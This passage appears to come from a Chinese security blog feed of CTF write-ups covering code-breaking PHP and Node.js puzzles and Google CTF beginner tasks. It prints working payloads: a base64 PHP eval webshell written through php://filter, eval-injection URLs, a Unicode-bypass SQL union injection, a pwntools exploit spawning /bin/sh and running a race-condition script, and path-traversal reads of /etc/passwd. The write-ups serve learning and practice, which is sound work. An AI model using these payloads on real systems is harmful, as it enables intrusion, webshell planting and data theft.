class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;    </span><br><span class="line">&lt;!-- Required meta tags --&gt;   </span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;    </span><br><span class="line">&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;    </span><br><span class="line">&lt;!-- Bootstrap CSS --&gt;    </span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css"</span> integrity=<span class="string">"sha256-eSi1q2PG6J7g7ib17yAaWMcrr5GrtohYChqibrV7PBE="</span> crossorigin=<span class="string">"anonymous"</span>&gt;</span><br><span class="line">&lt;title&gt;Domain Detail&lt;/title&gt;   </span><br><span class="line">&lt;style&gt;    pre &#123;        </span><br><span class="line">width: <span class="number">100</span>%;        </span><br><span class="line">background-color: <span class="comment">#f6f8fa;        </span></span><br><span class="line">border-radius: <span class="number">3</span>px;        </span><br><span class="line">font-size: <span class="number">85</span>%;       </span><br><span class="line">line-height: <span class="number">1.45</span>;       </span><br><span class="line">overflow: auto;       </span><br><span class="line">padding: <span class="number">16</span>px;        </span><br><span class="line">border: <span class="number">1</span>px solid <span class="comment">#ced4da;    </span></span><br><span class="line">&#125;    </span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;div class="container"&gt;    </span><br><span class="line">&lt;div class="row"&gt;        </span><br><span class="line">&lt;div class="col"&gt;            </span><br><span class="line">&lt;form method=<span class="string">"post"</span>&gt;                </span><br><span class="line">&lt;div class="input-group mt-3"&gt;                    </span><br><span class="line">&lt;div class="input-group-prepend"&gt;                        </span><br><span class="line">&lt;span class="input-group-text" id="basic-addon1"&gt;dig -t A -q&lt;/span&gt;                    </span><br><span class="line">&lt;/div&gt;                    </span><br><span class="line">&lt;input type="text" name="domain" class="form-control" placeholder="Your domain"&gt;                    </span><br><span class="line">&lt;div class="input-group-append"&gt;                        </span><br><span class="line">&lt;button class="btn btn-outline-secondary" type="submit"&gt;执行&lt;/button&gt;                    </span><br><span class="line">&lt;/div&gt;               </span><br><span class="line">&lt;/div&gt;            </span><br><span class="line">&lt;/form&gt;        </span><br><span class="line">&lt;/div&gt;        </span><br><span class="line">&lt;/div&gt;   </span><br><span class="line">&lt;div class="row"&gt;        </span><br><span class="line">&lt;div class="col"&gt;            </span><br><span class="line">&lt;pre class="mt-3"&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> $output;</span><br><span class="line">            <span class="keyword">endif</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;/pre&gt;        </span><br><span class="line">            &lt;/div&gt;   </span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;</span><br><span class="line">            &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>首先还是来看可控点，一个是域名可控，一个是文件名部分可控。然而这里有<code>escapeshellarg</code>导致我们的输入被默认成字符串，没有办法注入命令，所以只能执行域名解析。这里参考fish师傅的方法，这里最需要注意的是<code>file_get_contents</code>，这种文件操作经过blackhat的议题，可以知道都是可以操作php协议流的。而这里是将域名解析的输出写入一个日志中，所以基本思路就是利用php://filter将我们的base64编码的数据解码输入进日志文件中。</p><p>关于文件名的后缀问题，<code>http://wonderkun.cc/index.html/?p=626</code> 这篇文章中知道在文件路径中包含<code>/.</code>或者<code>/../</code>会导致pathinfo无法获取到后缀名，这样就绕过后缀判断，写入php文件。之后的问题域名解析的输出只有一部分是可控的，这里有一个要点就是base64会忽视不符合要求的特殊字符，然后会以4个字符为一组解码字符，所以只要前面的数据为4的倍数就能正确执行。其次由于我们的输入点在数据的中间部分，所以也不能有<code>=</code>符号。</p><p>这里写入文件有一个重要的点，通过上面的这种特殊路径写入的文件只能创建新的文件，无法覆盖原来的旧文件。这点很重要，我就白忙活了半个小时……</p><p>最后，这个文件名其中有一部分是server_name，这里的值是获取的客户端请求的host值，因为在使用php流的时候会包含php，这里就可以把php放入host值中。</p><img src="/2019/01/10/code-breaking-esay-wp/2.png"><p>其中base64编码下面的webshell</p><p><code>&lt;?php @eval($_POST[&#39;618&#39;]); ?&gt;</code></p><p><code>PD9waHAgQGV2YWwoJF9QT1NUWyc2MTgnXSk7Pz4</code></p><p>最后我们在<code>http://51.158.75.42:8082/data/558cb3b807e236696e9e2c79295d7fee/x618.php</code>执行代码就可以获取flag了。</p><p><code>618=var_dump(glob(&quot;/var/www/*&quot;));</code></p><p><code>618=var_dump(file_get_contents(&#39;/var/www/flag_phpmag1c_ur1&#39;));</code></p><h2 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一道老题，通过正则表达式我们可以知道，这个code只能执行嵌套的函数，例如<code>abc(def())</code>这种，这里的思路就是利用http的header来传输payload，利用php的获取header的函数，再eval执行，就变成了任意代码执行。</p><p><code>?code=current(getallheaders());</code></p><p>但是，WTF，这是nginx的服务器，没有apache的相关函数，找了半天无功而返…… 找了找fish师傅的wp，他是利用了<code>get_defined_vars</code> 函数获取定义的变量，但是有很多变量我们不可控怎么办？这里有一个 <code>reset()</code> 操作把之前的变量全部重置。所以变量就只剩下我们传输的get参数，这样我们直接把payload放在get请求中，用implode全部取出，然后拼接// 注释掉后面的部分，又变成了任意代码执行了。</p><p><code>http://51.158.75.42:8084/?1=var_dump(glob(%27/var/www/*%27));//&amp;code=eval(implode(reset(get_defined_vars())));</code></p><p>而这里两次eval，第一次eval是把变量重置之后全部提取出来，提取出来的字符串值再次eval，才会执行我们前面的代码。</p><p><code>http://51.158.75.42:8084/?1=var_dump(file_get_contents(%27/var/www/flag_phpbyp4ss%27));//&amp;code=eval(implode(reset(get_defined_vars())));</code></p><p>这里也可以是其他的payload，都是大同小异。</p><p><code>?code=eval(next(current(get_defined_vars())));&amp;b=var_dump(glob(%27/var/www/*%27));</code></p><p>另外一种思路是嵌套使用函数搜索目录读取文件。</p><p><code>code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></p><h2 id="easy-nodechr"><a href="#easy-nodechr" class="headerlink" title="easy - nodechr"></a>easy - nodechr</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// initial libraries</span></span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>)</span><br><span class="line"><span class="keyword">const</span> sqlite = <span class="built_in">require</span>(<span class="string">'sqlite'</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">'koa-views'</span>)</span><br><span class="line"><span class="keyword">const</span> Router = <span class="built_in">require</span>(<span class="string">'koa-router'</span>)</span><br><span class="line"><span class="keyword">const</span> send = <span class="built_in">require</span>(<span class="string">'koa-send'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'koa-bodyparser'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'koa-session'</span>)</span><br><span class="line"><span class="keyword">const</span> isString = <span class="built_in">require</span>(<span class="string">'underscore'</span>).isString</span><br><span class="line"><span class="keyword">const</span> basename = <span class="built_in">require</span>(<span class="string">'path'</span>).basename</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">JSON</span>.parse(fs.readFileSync(<span class="string">'../config.json'</span>, &#123;<span class="attr">encoding</span>: <span class="string">'utf-8'</span>, <span class="attr">flag</span>: <span class="string">'r'</span>&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> app = <span class="keyword">new</span> Koa()</span><br><span class="line">    <span class="keyword">const</span> router = <span class="keyword">new</span> Router()</span><br><span class="line">    <span class="keyword">const</span> db = <span class="keyword">await</span> sqlite.open(<span class="string">':memory:'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."users" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "username" TEXT NOT NULL,</span></span><br><span class="line"><span class="string">        "password" TEXT,</span></span><br><span class="line"><span class="string">        CONSTRAINT "unique_username" UNIQUE ("username")</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."flags" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "flag" TEXT NOT NULL</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> user <span class="keyword">of</span> config.users) &#123;</span><br><span class="line">        <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "users"("username", "password") VALUES ('<span class="subst">$&#123;user.username&#125;</span>', '<span class="subst">$&#123;user.password&#125;</span>')`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "flags"("flag") VALUES ('<span class="subst">$&#123;config.flag&#125;</span>')`</span>)</span><br><span class="line"></span><br><span class="line">    router.all(<span class="string">'login'</span>, <span class="string">'/login/'</span>, login).get(<span class="string">'admin'</span>, <span class="string">'/'</span>, admin).get(<span class="string">'static'</span>, <span class="string">'/static/:path(.+)'</span>, <span class="keyword">static</span>).get(<span class="string">'/source'</span>, source)</span><br><span class="line"></span><br><span class="line">    app.use(views(__dirname + <span class="string">'/views'</span>, &#123;</span><br><span class="line">        map: &#123;</span><br><span class="line">            html: <span class="string">'underscore'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        extension: <span class="string">'html'</span></span><br><span class="line">    &#125;)).use(bodyParser()).use(session(app))</span><br><span class="line">    </span><br><span class="line">    app.use(router.routes()).use(router.allowedMethods());</span><br><span class="line">    </span><br><span class="line">    app.keys = config.signed</span><br><span class="line">    app.context.db = db</span><br><span class="line">    app.context.router = router</span><br><span class="line">    app.listen(<span class="number">3000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">static</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, ctx.path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">admin</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!ctx.session.user) &#123;</span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        <span class="keyword">return</span> ctx.redirect(ctx.router.url(<span class="string">'login'</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> ctx.render(<span class="string">'admin'</span>, &#123;</span><br><span class="line">        <span class="string">'user'</span>: ctx.session.user</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, basename(__filename))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>这里的关键点就是<code>safeKeyword</code>函数的过滤黑名单，干掉了union和select，这以为着注入时彻底没办法使用了。在下面的登录查询逻辑中有一个很明显的注入，输入的字符串直接拼接进查询。其实一开始思路是从<code>isString</code>和<code>match</code>中寻找绕过方法，但是没有什么相关trick。后来在参考fish师傅的wp中，提到了toUpperCase，其实想想这里有个大写转换确实很诡异，所以突破口应该是在这里。果然在ph师傅的之前的文章中有fuzz出来的特殊字符。</p><p><code>https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</code></p><p>这里面 <code>ı</code> 能变成大写的<code>I</code> ，<code>ſ</code> 会变成大写的<code>S</code> ，那么这样就能在正常的字符中插入特殊字符绕过<code>safeKeyword</code>的检测。再加上我们知道flag存放在flags表中，user表的结构也是知道的，所以直接用union注入查flag的值。</p><p><code>&#39; unıon ſelect 1,flag,3 from flags where &#39;1&#39;=&#39;1</code></p><p>为了要闭合单引号，必须要凑个where语句。最终在登录界面拿到flag。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><code>https://lorexxar.cn/2018/12/07/codingbreak-wp/</code></p><p><code>https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</code></p><p><code>https://www.cnblogs.com/iamstudy/articles/code_breaking_writeup.html</code></p><p><code>http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</code></p><p><code>http://rui0.cn/archives/1015</code></p><p><code>https://blog.l0ca1.xyz/Code-Breaking</code></p><p><code>https://blog.csdn.net/fnmsd/article/details/84556522</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ph师傅的代码审计CTF题目 &lt;code&gt;https://code-breaking.com&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;easy-function&quot;&gt;&lt;a href=&quot;#easy-function&quot; class=&quot;headerlink&quot; title=&quot;easy 
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="代码审计" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner Part2</title>
    <link href="https://hurricane618.me/2018/08/15/google-ctf-beginner-part2/"/>
    <id>https://hurricane618.me/2018/08/15/google-ctf-beginner-part2/</id>
    <published>2018-08-14T16:47:21.000Z</published>
    <updated>2018-08-14T16:47:21.273Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Holey-Beep-PWN"><a href="#Holey-Beep-PWN" class="headerlink" title="Holey Beep(PWN)"></a>Holey Beep(PWN)</h2><p>Holey Beep是CVE-2018-0492，详细的漏洞细节 <a href="https://sigint.sh/#/holeybeep" target="_blank" rel="noopener">https://sigint.sh/#/holeybeep</a> 。一开始以为要用这个的exp，结果一看给的二进制文件，似乎不太对……我们需要得到<code>/secret_cake_recipe</code>的内容，然而权限不够，所以这里应该是拿来越权的。</p><img src="/2018/08/15/google-ctf-beginner-part2/1.png"><p>我们看到第一个if是一个通过信号触发的条件，第二个if知道了程序需要参数，然后会open一个写死的路径，之后将输入的参数代入<code>ioctl(device,0x4B2F,参数)</code>，出现问题就会打印报错信息，然后关闭打开的文件。循环上面的操作把所有的参数都跑一遍。</p><p>信号触发的if会执行额外的一段函数。</p><img src="/2018/08/15/google-ctf-beginner-part2/2.png"><p>这里if成功的话就会打印错误信息，读取open的文件输出出来。这里应该是重点，有读写操作。</p><p>如果我们读的文件是<code>/secret_cake_recipe</code>那么只要触发signal以及满足if判断就可以拿到数据。这里可以用<code>ln -s</code>软链接生成<code>dev/console</code>，然后我们执行该程序同时发送SIGTERM信号就可以越权拿到数据。这里需要注意的是我们要让程序延长运行时间才行，如果运行时间不足，还没接收到信号就结束了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"fridge-todo-list.ctfcompetition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"whz\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"read?"</span>)</span><br><span class="line">r.send(<span class="string">"-6\n"</span>)</span><br><span class="line">res = r.readuntil(<span class="string">"Hi whz,"</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">':'</span>, <span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,chr(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">"&lt;Q"</span>, write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr - <span class="number">0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"3\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"entry?"</span>)</span><br><span class="line">r.send(<span class="string">"-4\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">8</span> + pack(<span class="string">"&lt;Q"</span>, system_addr) + <span class="string">"\n"</span>)</span><br><span class="line">r.send(<span class="string">"/bin/sh\n"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.send(<span class="string">"cd /tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '#!/bin/bash' &gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'mkdir dev' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'ln -s /secret_cake_recipe dev/console' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '/home/user/holey_beep &#123;1..4096&#125; &amp;' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'pkill holey_beep -SIGTERM' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"chmod +x pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"./pwn.sh\n"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这里需要多试几次来触发条件竞争，最后拿到flag</p><img src="/2018/08/15/google-ctf-beginner-part2/3.png"><h2 id="Admin-UI-PWN-RE"><a href="#Admin-UI-PWN-RE" class="headerlink" title="Admin UI(PWN+RE)"></a>Admin UI(PWN+RE)</h2><p>看了题目的介绍，再加上这个补丁信息，知道了有路径穿越漏洞。而一看提供的功能中只有第二个选项有读的操作，然后试了一下<code>../../../../../../../../../../../etc/passwd</code>，果然读到了passwd文件。</p><img src="/2018/08/15/google-ctf-beginner-part2/4.png"><p>那么剩下来的就只是寻找要读的文件了。</p><p>通过使用<code>../../../../../../proc/self/cmdline</code>得到运行程序的命令行参数。</p><img src="/2018/08/15/google-ctf-beginner-part2/5.png"><p>得到运行程序的命名，需要猜路径，猜到了<code>../main</code>，把读取到的二进制文件保存下来 <code>printf &quot;2\n../main\n3\n&quot; | nc mngmnt-iface.ctfcompetition.com 1337 &gt; output.bin</code></p><p>再通过16进制编辑器把多余的目录删掉，这样就得到了服务器上的二进制文件。</p><p>浏览代码，在验证登录的过程中打开了<code>flag</code>文件，然后比较输入。这样目标就很明确了，直接读<code>../flag</code>就可以拿到flag。</p><img src="/2018/08/15/google-ctf-beginner-part2/6.png"><h2 id="Admin-UI-2-PWN-RE"><a href="#Admin-UI-2-PWN-RE" class="headerlink" title="Admin UI 2(PWN+RE)"></a>Admin UI 2(PWN+RE)</h2><p>继续上一题的程序分析第二个密码</p><img src="/2018/08/15/google-ctf-beginner-part2/7.png"><p>可以看到这里对我们的输入异或之后会得到flag数组中的赋值，我们可以得到flag数组的值，只要再次异或回去即可得到密码。</p><img src="/2018/08/15/google-ctf-beginner-part2/8.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e_string = [<span class="number">0x84</span>, <span class="number">0x93</span>, <span class="number">0x81</span>, <span class="number">0xbc</span>, <span class="number">0x93</span>, <span class="number">0xb0</span>, <span class="number">0xa8</span>, <span class="number">0x98</span>, <span class="number">0x97</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0x94</span>, <span 